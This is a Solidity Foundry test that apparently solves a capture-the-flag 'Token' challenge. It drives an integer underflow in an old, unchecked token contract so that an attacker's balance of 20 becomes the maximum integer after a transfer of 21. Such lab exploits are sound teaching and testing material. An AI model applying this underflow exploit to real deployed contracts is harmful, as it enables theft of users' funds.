// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";

// we are using interface here and not import Token.sol
// because Token.sol is in solidity 0.6.0
interface IToken {
    function transfer(address _to, uint256 _value) external returns (bool);
    function balanceOf(address _owner) external view returns (uint256);
}

contract TokenExploitTest is Test {
    IToken public target;
    address constant ATTACKER = address(0xBEEF);
    address constant WHATEVER = address(0xABCDEF);

    function setUp() public {
        address targetAddr = deployCode("Token.sol", abi.encode(424242));
        target = IToken(targetAddr);
        target.transfer(ATTACKER, 20);
        vm.deal(ATTACKER, 1 ether);
    }

    function testExploit() public {
        vm.prank(ATTACKER);
        target.transfer(WHATEVER, 21);
        assertEq(target.balanceOf(ATTACKER), UINT256_MAX, "ATTACKER is not rich enough");
    }
}